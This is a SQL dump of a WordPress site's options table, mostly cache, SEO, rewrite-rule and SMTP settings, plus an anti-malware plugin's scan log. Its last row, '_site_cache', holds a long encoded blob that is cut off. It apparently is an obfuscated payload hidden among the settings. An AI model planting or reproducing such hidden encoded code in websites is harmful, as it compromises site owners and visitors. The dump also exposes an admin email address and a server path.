INSERT INTO `cmrfu_options` VALUES("194","wpsupercache_start","1392830877","yes");
INSERT INTO `cmrfu_options` VALUES("195","wpsupercache_count","0","yes");
INSERT INTO `cmrfu_options` VALUES("196","ossdl_https","0","yes");
INSERT INTO `cmrfu_options` VALUES("1138","wpseo_internallinks","a:10:{s:20:\"breadcrumbs-404crumb\";s:0:\"\";s:23:\"breadcrumbs-blog-remove\";b:0;s:20:\"breadcrumbs-boldlast\";b:0;s:25:\"breadcrumbs-archiveprefix\";s:0:\"\";s:18:\"breadcrumbs-enable\";b:0;s:16:\"breadcrumbs-home\";s:0:\"\";s:18:\"breadcrumbs-prefix\";s:0:\"\";s:24:\"breadcrumbs-searchprefix\";s:0:\"\";s:15:\"breadcrumbs-sep\";s:7:\"&raquo;\";s:23:\"post_types-post-maintax\";i:0;}","yes");
INSERT INTO `cmrfu_options` VALUES("1182","wpsupercache_gc_time","1409345334","yes");
INSERT INTO `cmrfu_options` VALUES("656","db_upgraded","","yes");
INSERT INTO `cmrfu_options` VALUES("2710","mail_from","info@herkonyapi.com","yes");
INSERT INTO `cmrfu_options` VALUES("269","ld_http_auth","none","yes");
INSERT INTO `cmrfu_options` VALUES("270","ld_hide_wp_admin","yep","yes");
INSERT INTO `cmrfu_options` VALUES("271","ld_login_base","yonetim","yes");
INSERT INTO `cmrfu_options` VALUES("623","auto_core_update_notified","a:4:{s:4:\"type\";s:7:\"success\";s:5:\"email\";s:19:\"info@herkonyapi.com\";s:7:\"version\";s:6:\"3.8.16\";s:9:\"timestamp\";i:1473265619;}","yes");
INSERT INTO `cmrfu_options` VALUES("15439","rewrite_rules","a:147:{s:19:\"sitemap_index\\.xml$\";s:19:\"index.php?sitemap=1\";s:31:\"([^/]+?)-sitemap([0-9]+)?\\.xml$\";s:51:\"index.php?sitemap=$matches[1]&sitemap_n=$matches[2]\";s:24:\"([a-z]+)?-?sitemap\\.xsl$\";s:25:\"index.php?xsl=$matches[1]\";s:11:\"^wp-json/?$\";s:22:\"index.php?rest_route=/\";s:14:\"^wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:21:\"^index.php/wp-json/?$\";s:22:\"index.php?rest_route=/\";s:24:\"^index.php/wp-json/(.*)?\";s:33:\"index.php?rest_route=/$matches[1]\";s:17:\"portfolio-item/?$\";s:29:\"index.php?post_type=portfolio\";s:47:\"portfolio-item/feed/(feed|rdf|rss|rss2|atom)/?$\";s:46:\"index.php?post_type=portfolio&feed=$matches[1]\";s:42:\"portfolio-item/(feed|rdf|rss|rss2|atom)/?$\";s:46:\"index.php?post_type=portfolio&feed=$matches[1]\";s:34:\"portfolio-item/page/([0-9]{1,})/?$\";s:47:\"index.php?post_type=portfolio&paged=$matches[1]\";s:8:\"slide/?$\";s:26:\"index.php?post_type=slider\";s:38:\"slide/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?post_type=slider&feed=$matches[1]\";s:33:\"slide/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?post_type=slider&feed=$matches[1]\";s:25:\"slide/page/([0-9]{1,})/?$\";s:44:\"index.php?post_type=slider&paged=$matches[1]\";s:47:\"category/(.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:42:\"category/(.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?category_name=$matches[1]&feed=$matches[2]\";s:23:\"category/(.+?)/embed/?$\";s:46:\"index.php?category_name=$matches[1]&embed=true\";s:35:\"category/(.+?)/page/?([0-9]{1,})/?$\";s:53:\"index.php?category_name=$matches[1]&paged=$matches[2]\";s:17:\"category/(.+?)/?$\";s:35:\"index.php?category_name=$matches[1]\";s:44:\"tag/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:39:\"tag/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?tag=$matches[1]&feed=$matches[2]\";s:20:\"tag/([^/]+)/embed/?$\";s:36:\"index.php?tag=$matches[1]&embed=true\";s:32:\"tag/([^/]+)/page/?([0-9]{1,})/?$\";s:43:\"index.php?tag=$matches[1]&paged=$matches[2]\";s:14:\"tag/([^/]+)/?$\";s:25:\"index.php?tag=$matches[1]\";s:45:\"type/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:40:\"type/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?post_format=$matches[1]&feed=$matches[2]\";s:21:\"type/([^/]+)/embed/?$\";s:44:\"index.php?post_format=$matches[1]&embed=true\";s:33:\"type/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?post_format=$matches[1]&paged=$matches[2]\";s:15:\"type/([^/]+)/?$\";s:33:\"index.php?post_format=$matches[1]\";s:59:\"portfolio_category/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:57:\"index.php?portfolio_category=$matches[1]&feed=$matches[2]\";s:54:\"portfolio_category/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:57:\"index.php?portfolio_category=$matches[1]&feed=$matches[2]\";s:35:\"portfolio_category/([^/]+)/embed/?$\";s:51:\"index.php?portfolio_category=$matches[1]&embed=true\";s:47:\"portfolio_category/([^/]+)/page/?([0-9]{1,})/?$\";s:58:\"index.php?portfolio_category=$matches[1]&paged=$matches[2]\";s:29:\"portfolio_category/([^/]+)/?$\";s:40:\"index.php?portfolio_category=$matches[1]\";s:53:\"tag_category/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?portfolio_tag=$matches[1]&feed=$matches[2]\";s:48:\"tag_category/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:52:\"index.php?portfolio_tag=$matches[1]&feed=$matches[2]\";s:29:\"tag_category/([^/]+)/embed/?$\";s:46:\"index.php?portfolio_tag=$matches[1]&embed=true\";s:41:\"tag_category/([^/]+)/page/?([0-9]{1,})/?$\";s:53:\"index.php?portfolio_tag=$matches[1]&paged=$matches[2]\";s:23:\"tag_category/([^/]+)/?$\";s:35:\"index.php?portfolio_tag=$matches[1]\";s:42:\"portfolio-item/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:52:\"portfolio-item/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:72:\"portfolio-item/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:67:\"portfolio-item/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:67:\"portfolio-item/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:48:\"portfolio-item/[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:31:\"portfolio-item/([^/]+)/embed/?$\";s:42:\"index.php?portfolio=$matches[1]&embed=true\";s:35:\"portfolio-item/([^/]+)/trackback/?$\";s:36:\"index.php?portfolio=$matches[1]&tb=1\";s:55:\"portfolio-item/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:48:\"index.php?portfolio=$matches[1]&feed=$matches[2]\";s:50:\"portfolio-item/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:48:\"index.php?portfolio=$matches[1]&feed=$matches[2]\";s:43:\"portfolio-item/([^/]+)/page/?([0-9]{1,})/?$\";s:49:\"index.php?portfolio=$matches[1]&paged=$matches[2]\";s:50:\"portfolio-item/([^/]+)/comment-page-([0-9]{1,})/?$\";s:49:\"index.php?portfolio=$matches[1]&cpage=$matches[2]\";s:39:\"portfolio-item/([^/]+)(?:/([0-9]+))?/?$\";s:48:\"index.php?portfolio=$matches[1]&page=$matches[2]\";s:31:\"portfolio-item/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:41:\"portfolio-item/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:61:\"portfolio-item/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:56:\"portfolio-item/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:56:\"portfolio-item/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:37:\"portfolio-item/[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:33:\"slide/[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:43:\"slide/[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:63:\"slide/[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:58:\"slide/[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:58:\"slide/[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:39:\"slide/[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:22:\"slide/([^/]+)/embed/?$\";s:39:\"index.php?slider=$matches[1]&embed=true\";s:26:\"slide/([^/]+)/trackback/?$\";s:33:\"index.php?slider=$matches[1]&tb=1\";s:46:\"slide/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:45:\"index.php?slider=$matches[1]&feed=$matches[2]\";s:41:\"slide/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:45:\"index.php?slider=$matches[1]&feed=$matches[2]\";s:34:\"slide/([^/]+)/page/?([0-9]{1,})/?$\";s:46:\"index.php?slider=$matches[1]&paged=$matches[2]\";s:41:\"slide/([^/]+)/comment-page-([0-9]{1,})/?$\";s:46:\"index.php?slider=$matches[1]&cpage=$matches[2]\";s:30:\"slide/([^/]+)(?:/([0-9]+))?/?$\";s:45:\"index.php?slider=$matches[1]&page=$matches[2]\";s:22:\"slide/[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:32:\"slide/[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:52:\"slide/[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:47:\"slide/[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:47:\"slide/[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:28:\"slide/[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:12:\"robots\\.txt$\";s:18:\"index.php?robots=1\";s:48:\".*wp-(atom|rdf|rss|rss2|feed|commentsrss2)\\.php$\";s:18:\"index.php?feed=old\";s:20:\".*wp-app\\.php(/.*)?$\";s:19:\"index.php?error=403\";s:18:\".*wp-register.php$\";s:23:\"index.php?register=true\";s:32:\"feed/(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:27:\"(feed|rdf|rss|rss2|atom)/?$\";s:27:\"index.php?&feed=$matches[1]\";s:8:\"embed/?$\";s:21:\"index.php?&embed=true\";s:20:\"page/?([0-9]{1,})/?$\";s:28:\"index.php?&paged=$matches[1]\";s:27:\"comment-page-([0-9]{1,})/?$\";s:40:\"index.php?&page_id=524&cpage=$matches[1]\";s:41:\"comments/feed/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:36:\"comments/(feed|rdf|rss|rss2|atom)/?$\";s:42:\"index.php?&feed=$matches[1]&withcomments=1\";s:17:\"comments/embed/?$\";s:21:\"index.php?&embed=true\";s:44:\"search/(.+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:39:\"search/(.+)/(feed|rdf|rss|rss2|atom)/?$\";s:40:\"index.php?s=$matches[1]&feed=$matches[2]\";s:20:\"search/(.+)/embed/?$\";s:34:\"index.php?s=$matches[1]&embed=true\";s:32:\"search/(.+)/page/?([0-9]{1,})/?$\";s:41:\"index.php?s=$matches[1]&paged=$matches[2]\";s:14:\"search/(.+)/?$\";s:23:\"index.php?s=$matches[1]\";s:47:\"author/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:42:\"author/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:50:\"index.php?author_name=$matches[1]&feed=$matches[2]\";s:23:\"author/([^/]+)/embed/?$\";s:44:\"index.php?author_name=$matches[1]&embed=true\";s:35:\"author/([^/]+)/page/?([0-9]{1,})/?$\";s:51:\"index.php?author_name=$matches[1]&paged=$matches[2]\";s:17:\"author/([^/]+)/?$\";s:33:\"index.php?author_name=$matches[1]\";s:69:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:64:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:80:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&feed=$matches[4]\";s:45:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/embed/?$\";s:74:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&embed=true\";s:57:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:81:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]&paged=$matches[4]\";s:39:\"([0-9]{4})/([0-9]{1,2})/([0-9]{1,2})/?$\";s:63:\"index.php?year=$matches[1]&monthnum=$matches[2]&day=$matches[3]\";s:56:\"([0-9]{4})/([0-9]{1,2})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:51:\"([0-9]{4})/([0-9]{1,2})/(feed|rdf|rss|rss2|atom)/?$\";s:64:\"index.php?year=$matches[1]&monthnum=$matches[2]&feed=$matches[3]\";s:32:\"([0-9]{4})/([0-9]{1,2})/embed/?$\";s:58:\"index.php?year=$matches[1]&monthnum=$matches[2]&embed=true\";s:44:\"([0-9]{4})/([0-9]{1,2})/page/?([0-9]{1,})/?$\";s:65:\"index.php?year=$matches[1]&monthnum=$matches[2]&paged=$matches[3]\";s:26:\"([0-9]{4})/([0-9]{1,2})/?$\";s:47:\"index.php?year=$matches[1]&monthnum=$matches[2]\";s:43:\"([0-9]{4})/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:38:\"([0-9]{4})/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?year=$matches[1]&feed=$matches[2]\";s:19:\"([0-9]{4})/embed/?$\";s:37:\"index.php?year=$matches[1]&embed=true\";s:31:\"([0-9]{4})/page/?([0-9]{1,})/?$\";s:44:\"index.php?year=$matches[1]&paged=$matches[2]\";s:13:\"([0-9]{4})/?$\";s:26:\"index.php?year=$matches[1]\";s:27:\".?.+?/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\".?.+?/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\".?.+?/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\".?.+?/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\".?.+?/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"(.?.+?)/embed/?$\";s:41:\"index.php?pagename=$matches[1]&embed=true\";s:20:\"(.?.+?)/trackback/?$\";s:35:\"index.php?pagename=$matches[1]&tb=1\";s:40:\"(.?.+?)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:35:\"(.?.+?)/(feed|rdf|rss|rss2|atom)/?$\";s:47:\"index.php?pagename=$matches[1]&feed=$matches[2]\";s:28:\"(.?.+?)/page/?([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&paged=$matches[2]\";s:35:\"(.?.+?)/comment-page-([0-9]{1,})/?$\";s:48:\"index.php?pagename=$matches[1]&cpage=$matches[2]\";s:24:\"(.?.+?)(?:/([0-9]+))?/?$\";s:47:\"index.php?pagename=$matches[1]&page=$matches[2]\";s:27:\"[^/]+/attachment/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:37:\"[^/]+/attachment/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:57:\"[^/]+/attachment/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:52:\"[^/]+/attachment/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:33:\"[^/]+/attachment/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";s:16:\"([^/]+)/embed/?$\";s:37:\"index.php?name=$matches[1]&embed=true\";s:20:\"([^/]+)/trackback/?$\";s:31:\"index.php?name=$matches[1]&tb=1\";s:40:\"([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:35:\"([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:43:\"index.php?name=$matches[1]&feed=$matches[2]\";s:28:\"([^/]+)/page/?([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&paged=$matches[2]\";s:35:\"([^/]+)/comment-page-([0-9]{1,})/?$\";s:44:\"index.php?name=$matches[1]&cpage=$matches[2]\";s:24:\"([^/]+)(?:/([0-9]+))?/?$\";s:43:\"index.php?name=$matches[1]&page=$matches[2]\";s:16:\"[^/]+/([^/]+)/?$\";s:32:\"index.php?attachment=$matches[1]\";s:26:\"[^/]+/([^/]+)/trackback/?$\";s:37:\"index.php?attachment=$matches[1]&tb=1\";s:46:\"[^/]+/([^/]+)/feed/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/(feed|rdf|rss|rss2|atom)/?$\";s:49:\"index.php?attachment=$matches[1]&feed=$matches[2]\";s:41:\"[^/]+/([^/]+)/comment-page-([0-9]{1,})/?$\";s:50:\"index.php?attachment=$matches[1]&cpage=$matches[2]\";s:22:\"[^/]+/([^/]+)/embed/?$\";s:43:\"index.php?attachment=$matches[1]&embed=true\";}","yes");
INSERT INTO `cmrfu_options` VALUES("16175","portfolio_category_children","a:1:{i:58;a:1:{i:0;i:60;}}","yes");
INSERT INTO `cmrfu_options` VALUES("15769","GOTMLS_scan_log/176.233.124.87/1478819375.0658","a:2:{s:8:\"settings\";a:12:{s:12:\"msg_position\";a:4:{i:0;s:5:\"427px\";i:1;s:5:\"150px\";i:2;s:5:\"400px\";i:3;s:5:\"600px\";}s:9:\"scan_what\";i:2;s:10:\"scan_depth\";i:-1;s:11:\"exclude_ext\";a:29:{i:0;s:3:\"png\";i:1;s:3:\"jpg\";i:2;s:4:\"jpeg\";i:3;s:3:\"gif\";i:4;s:3:\"bmp\";i:5;s:3:\"tif\";i:6;s:4:\"tiff\";i:7;s:3:\"psd\";i:8;s:3:\"svg\";i:9;s:3:\"ico\";i:10;s:3:\"doc\";i:11;s:4:\"docx\";i:12;s:3:\"ttf\";i:13;s:3:\"fla\";i:14;s:3:\"flv\";i:15;s:3:\"mov\";i:16;s:3:\"mp3\";i:17;s:3:\"pdf\";i:18;s:3:\"css\";i:19;s:3:\"pot\";i:20;s:2:\"po\";i:21;s:2:\"mo\";i:22;s:2:\"so\";i:23;s:3:\"exe\";i:24;s:3:\"zip\";i:25;s:2:\"7z\";i:26;s:2:\"gz\";i:27;s:3:\"rar\";i:28;s:2:\"js\";}s:12:\"check_custom\";s:0:\"\";s:11:\"exclude_dir\";a:1:{i:0;s:4:\".git\";}s:8:\"user_can\";s:16:\"activate_plugins\";s:14:\"quarantine_dir\";b:0;s:10:\"dont_check\";a:0:{}s:10:\"scan_level\";i:3;s:5:\"check\";a:3:{i:0;s:8:\"backdoor\";i:1;s:5:\"known\";i:2;s:9:\"potential\";}s:15:\"skip_quarantine\";i:0;}s:4:\"scan\";a:7:{s:3:\"dir\";s:37:\"/home/srkn/herkonyapi.com/public_html\";s:5:\"start\";i:1478819375;s:4:\"type\";s:13:\"Complete Scan\";s:9:\"microtime\";d:1037;s:7:\"percent\";i:-1;s:11:\"last_threat\";d:1478820412.410625;s:6:\"finish\";i:1478820412;}}","yes");
INSERT INTO `cmrfu_options` VALUES("2705","wp_smtp_options","a:9:{s:4:\"from\";s:0:\"\";s:8:\"fromname\";s:0:\"\";s:4:\"host\";s:0:\"\";s:10:\"smtpsecure\";s:0:\"\";s:4:\"port\";s:0:\"\";s:8:\"smtpauth\";s:3:\"yes\";s:8:\"username\";s:0:\"\";s:8:\"password\";s:0:\"\";s:10:\"deactivate\";s:0:\"\";}","yes");
INSERT INTO `cmrfu_options` VALUES("2712","mailer","smtp","yes");
INSERT INTO `cmrfu_options` VALUES("2713","mail_set_return_path","","yes");
INSERT INTO `cmrfu_options` VALUES("2714","smtp_host","smtp.yandex.ru","yes");
INSERT INTO `cmrfu_options` VALUES("2715","smtp_port","587","yes");
INSERT INTO `cmrfu_options` VALUES("2716","smtp_ssl","tls","yes");
INSERT INTO `cmrfu_options` VALUES("2717","smtp_auth","true","yes");
INSERT INTO `cmrfu_options` VALUES("15391","_site_cache","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